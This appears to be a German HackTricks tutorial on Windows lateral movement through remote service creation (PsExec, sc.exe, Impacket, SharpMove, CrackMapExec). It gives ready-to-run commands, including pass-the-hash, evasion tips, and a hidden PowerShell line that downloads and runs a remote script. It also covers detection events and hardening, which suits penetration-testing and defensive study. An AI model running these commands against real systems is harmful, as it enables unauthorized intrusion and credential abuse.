# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Wie funktionieren sie?

Diese Techniken missbrauchen den Windows Service Control Manager (SCM) über SMB/RPC aus der Ferne, um Befehle auf einem Zielhost auszuführen. Der typische Ablauf ist:

1. Sich am Ziel anmelden und über SMB (TCP/445) auf die ADMIN$-Freigabe zugreifen.
2. Eine ausführbare Datei kopieren oder eine LOLBAS-Befehlszeile angeben, die der Dienst ausführen soll.
3. Über SCM (MS-SCMR über \PIPE\svcctl) einen Dienst auf dem Ziel erstellen, der auf diesen Befehl oder diese Binärdatei verweist.
4. Den Dienst starten, um die Payload auszuführen, und optional stdin/stdout über eine Named Pipe erfassen.
5. Den Dienst stoppen und aufräumen (den Dienst und alle abgelegten Binärdateien löschen).

Anforderungen/Voraussetzungen:
- Lokaler Administrator auf dem Ziel (SeCreateServicePrivilege) oder explizite Berechtigungen zum Erstellen von Diensten auf dem Ziel.
- SMB (445) erreichbar und ADMIN$-Freigabe verfügbar; Remote Service Management muss durch die Host-Firewall zugelassen sein.
- UAC Remote Restrictions: Bei lokalen Konten kann die Token-Filterung den Administratorzugriff über das Netzwerk blockieren, sofern nicht das integrierte Administratorkonto oder LocalAccountTokenFilterPolicy=1 verwendet wird.
- Kerberos vs. NTLM: Ein Hostname/FQDN ermöglicht Kerberos; bei Verbindung über eine IP-Adresse wird häufig auf NTLM zurückgegriffen (was in gehärteten Umgebungen blockiert sein kann).

### Manuelles ScExec/WinExec mit sc.exe

Das folgende Beispiel zeigt einen minimalen Ansatz zum Erstellen eines Dienstes. Als Dienstabbild kann eine abgelegte EXE oder ein LOLBAS wie cmd.exe oder powershell.exe verwendet werden.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Hinweise:
- Rechne beim Starten einer EXE, die kein Dienst ist, mit einem Timeout-Fehler; die Ausführung findet trotzdem statt.
- Um OPSEC-freundlicher vorzugehen, bevorzuge fileless-Befehle (cmd /c, powershell -enc) oder lösche abgelegte Artefakte.

Ausführlichere Schritte findest du unter: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Tooling und Beispiele

### Sysinternals PsExec.exe

- Klassisches Admin-Tool, das SMB nutzt, um PSEXESVC.exe in ADMIN$ abzulegen, einen temporären Dienst (Standardname PSEXESVC) zu installieren und I/O über Named Pipes weiterzuleiten.
- Anwendungsbeispiele:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Du kannst es direkt über WebDAV von Sysinternals Live starten:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Hinterlässt Ereignisse zur Installation/Deinstallation von Diensten (Dienstname oft PSEXESVC, sofern -r nicht verwendet wird) und erstellt während der Ausführung C:\Windows\PSEXESVC.exe.

### Impacket psexec.py (PsExec-like)

- Verwendet einen eingebetteten RemCom-ähnlichen Dienst. Legt über ADMIN$ eine temporäre Dienst-Binärdatei ab (häufig mit zufälligem Namen), erstellt einen Dienst (standardmäßig oft RemComSvc) und leitet die I/O über eine Named Pipe weiter.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Artefakte
- Temporäre EXE in C:\Windows\ (8 zufällige Zeichen). Der Dienstname lautet standardmäßig RemComSvc, sofern er nicht überschrieben wird.

### Impacket smbexec.py (SMBExec)

- Erstellt einen temporären Dienst, der cmd.exe startet, und verwendet für die Ein-/Ausgabe eine benannte Pipe. Vermeidet im Allgemeinen das Ablegen einer vollständigen EXE-Payload; die Befehlsausführung ist halbinteraktiv.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral und SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementiert mehrere Methoden für Lateral Movement, darunter servicebasiertes Exec.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) ermöglicht das Ändern/Erstellen von Diensten, um einen Befehl remote auszuführen.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Du kannst auch CrackMapExec verwenden, um Befehle über verschiedene Backends auszuführen (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, Erkennung und Artefakte

Typische Host-/Netzwerk-Artefakte bei der Verwendung von PsExec-ähnlichen Techniken:
- Security 4624 (Logon Type 3) und 4672 (Special Privileges) auf dem Ziel für das verwendete Administratorkonto.
- Security 5140/5145 File Share- und File Share Detailed-Ereignisse, die den Zugriff auf ADMIN$ sowie das Erstellen/Schreiben von Service-Binaries (z. B. PSEXESVC.exe oder eine zufällige 8 Zeichen lange .exe) zeigen.
- **System** 7045 vom Service Control Manager für die Installation eines Dienstes auf dem Ziel: Namen wie PSEXESVC, RemComSvc oder benutzerdefinierte Namen (`-r` / `-service-name`). Dies belegt, dass ein Dienst installiert wurde, nicht, dass sein Image ausgeführt wurde. Gleiche den Zeitstempel und den Image-Pfad mit Process-Ereignissen oder, sofern verfügbar, einem passenden Service-Image-Prefetch-Eintrag ab.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) für services.exe oder das Service-Image, 3 (Network Connect), 11 (File Create) in C:\Windows\, 17/18 (Pipe Created/Connected) für Pipes wie \\.\pipe\psexesvc, \\.\pipe\remcom_* oder randomisierte Entsprechungen.
- Registry-Artefakt für die Sysinternals-EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 auf dem Operator-Host (falls nicht unterdrückt).

Ansätze für die Suche
- Alarm bei Dienstinstallationen auslösen, deren ImagePath cmd.exe /c, powershell.exe oder TEMP-Verzeichnisse enthält.
- Nach Prozesserstellungen suchen, bei denen ParentImage C:\Windows\PSEXESVC.exe ist, oder nach unter LOCAL SYSTEM laufenden Kindern von services.exe, die Shells ausführen.
- Named Pipes markieren, die mit -stdin/-stdout/-stderr enden, oder bekannte PsExec-Clone-Pipe-Namen verwenden.

## Behebung häufiger Probleme
- Zugriff verweigert (5) beim Erstellen von Diensten: tatsächlich kein lokaler Administrator, UAC-Remoteeinschränkungen für lokale Konten oder Manipulationsschutz von EDR für den Pfad des Service-Binaries.
- Der Netzwerkpfad wurde nicht gefunden (53) oder Verbindung zu ADMIN$ nicht möglich: Firewall blockiert SMB/RPC oder Administratorfreigaben sind deaktiviert.
- Kerberos schlägt fehl, aber NTLM ist blockiert: Verbindung über Hostname/FQDN (nicht IP) herstellen, korrekte SPNs sicherstellen oder bei Verwendung von Impacket `-k`/`-no-pass` mit Tickets angeben.
- Der Dienststart läuft in einen Timeout, aber das Payload wurde ausgeführt: erwartbar, wenn es sich nicht um ein echtes Service-Binary handelt; Ausgabe in eine Datei schreiben oder smbexec für Live-I/O verwenden.

## Hinweise zur Härtung
- Windows 11 24H2 und Windows Server 2025 erfordern standardmäßig SMB signing für ausgehende Verbindungen (und unter Windows 11 auch für eingehende Verbindungen). Dies verhindert die legitime Nutzung von PsExec mit gültigen Anmeldedaten nicht, unterbindet aber Missbrauch durch unsigniertes SMB-Relay und kann Geräte beeinträchtigen, die signing nicht unterstützen.<sup>[[2]](#references)</sup>
- Die neue NTLM-Blockierung des SMB-Clients (Windows 11 24H2/Server 2025) kann einen NTLM-Fallback verhindern, wenn eine Verbindung über eine IP-Adresse oder zu Servern ohne Kerberos hergestellt wird. In gehärteten Umgebungen funktioniert dadurch NTLM-basiertes PsExec/SMBExec nicht mehr; verwende Kerberos (Hostname/FQDN) oder konfiguriere bei berechtigtem Bedarf Ausnahmen.<sup>[[2]](#references)</sup>
- Prinzip der geringsten Berechtigungen: Mitgliedschaften in lokalen Administratorgruppen minimieren, Just-in-Time-/Just-Enough-Admin bevorzugen, LAPS erzwingen und Dienstinstallationen mit Ereignis 7045 überwachen bzw. dafür Alarme einrichten.

## Siehe auch

- WMI-basierte Remote-Ausführung (oft mit weniger Dateien):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-basierte Remote-Ausführung:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec – Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB-Sicherheitshärtung in Windows Server 2025 und Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Anmeldedaten verwenden, um Windows-Computer zu übernehmen – Teil 2 (PSExec und Dienste)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Unerwartete Neustarts mithilfe von Systemereignisprotokollen beheben](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
